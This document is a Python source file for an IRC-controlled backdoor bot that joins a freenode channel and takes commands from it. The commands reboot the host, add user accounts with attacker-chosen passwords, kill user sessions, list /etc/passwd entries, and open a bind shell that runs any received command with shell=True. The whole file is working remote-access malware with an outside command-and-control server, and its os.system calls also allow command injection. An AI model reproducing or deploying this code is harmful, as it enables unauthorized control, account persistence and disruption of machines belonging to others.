import subprocess, sys, base64, os, socket, threading, random
from time import sleep

info = "rip"
newUser = "lol"
newPass = "changme"

###
### Function to initiate irc connection and begin listening for commands.
### When a user sends a recognized command it executes the respective function
### 
def ircConnect():
	
    #info for irc channel
    network = 'irc.freenode.net'
    port = 6667
    channel = '#doshchannel'
    password = 'password'
    nick = "doshBot"
   
    #Connect to irc server and register nick
    irc = socket.socket( socket.AF_INET, socket.SOCK_STREAM)
    irc.connect( (network, port) )
    print irc.recv( 4096 )
    irc.send("USER " + nick + " " + nick + " " + nick + ":This is a test. \n")
    irc.send("NICK " + nick + "\n")
    irc.send("PRIVMSG" + " NICKSERV :identify " + password + "\n")
    irc.send("JOIN " + channel + '\n')
    
    # Listen for commands
    while 1:
        text = irc.recv(2040)
        print text
        if(text.find('PING') != -1):
            irc.send('PONG ' + text.split()[1] + '\r\n')

        elif(text.find(':!speak') != -1):
            irc.send('PRIVMSG ' + channel + ' :This guy fucks' + '\r\n')
	
	elif(text.find(':!addUser') != -1):
           temp = text.find(':!addUser')
	   temp = int(temp) + 9
	   if(text[temp:] != ""):
	   	info = text[temp:]
		info = info.strip().split()
		newUser = info[0]
	        newPass = info[1]
		print newUser
		print newPass
	
	   try:
		addUser(newUser, newPass)
	   except Exception:
		irc.send('PRIVMSG ' + channel + ' :Could not add user.\r\n')
	   else:
	   	irc.send('PRIVMSG ' + channel + ' :User added.\r\n')


	elif(text.find(':!reboot') != -1):
	   reboot()
	
	elif(text.find(':!killUser') != -1):
	   temp = text.find(':!killUser')
	   temp = int(temp) + 10
	   if(text[temp:] != ""):
		user = text[temp:]
		user = user.strip()
		print user
	   
	   try:
		killUser(user)
	   except Exception:
		irc.send('PRIVMSG ' + channel + ' :Unable to to kill user.\r\n')
	   else:
	   	irc.send('PRIVMSG ' + channel + ' :User killed.\r\n')
	  

	elif(text.find(':!dropShell') != -1):
	    newPort = random.randint(60000,64000)
            dropShell(newPort)
	    irc.send('PRIVMSG ' + channel + ' :Shell listening on port ' + str(newPort) + '\r\n')	
 
	elif(text.find(':!listUsers') != -1):
	    userList = listUsers()
	    returnString = ""
	    for x in userList:
		returnString += (x + ', ')
	    irc.send('PRIVMSG '+ channel + ' :' + returnString + '\r\n')
	    
	elif(text.find(':!help') != -1):
	    irc.send('PRIVMSG ' + channel + ' :Commands - !speak, !reboot, !dropShell, !listUsers, !addUser [name] [password], killUser [user]\r\n')


###
### Call a reboot of the host computer
### @params - none
### @returns - none
###
def reboot():
    os.system('reboot')


###
### Handle a request from the shell connection
### @params - none
### @returns - none
###
def handleClient(client_socket):
   
    while True: 
    	request = client_socket.recv(2048)
    	print request
    	if not request:
		break
    	output = subprocess.check_output(request, stderr=subprocess.STDOUT, shell=True)
    	client_socket.send(output)


###
### Shell for remote to connect to
### @params - none
### @return - none
###
def shell(newPort):
   
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(('', newPort))
    server.listen(5)
    
    while True:
	
	client, address = server.accept()
	client_handler = threading.Thread(target=handleClient, args=(client,))
	client_handler.start()

###
### Opens up a shell on the host machine
### @params - none
### @returns - the port and ip to connect to the shell
###
def dropShell(newPort):
    newShell = threading.Thread(target=shell, args=(newPort,))
    newShell.start()

###
### List the users found in /etc/passwd
### @params - none
### @returns - list of users in /etc/passwd(string)
### 
def listUsers():
    output = []
    os.system("awk -F':' '{ print $1}' /etc/passwd >> output.file")
    f = open("output.file", "r")
    for line in f:
	line = line.replace('\n', '')
	output += [line]
    f.close()
    os.system("rm output.file")
    return output

###
### Adds a user on the machine through the useradd command
### @params - the name of the user(string), password for the user(string)
### @returns - nothing
###  
def addUser(user, passw):
    os.system('useradd ' + user + ' -p ' + passw)

###
### Kills the session of the user specified
### @params - name of the user(string)
### @returns - nothing
###
def killUser(user):
    os.system('skill -KILL -u ' + user)

###
### main call to run program
###
if __name__ == '__main__':
    ircConnect()


















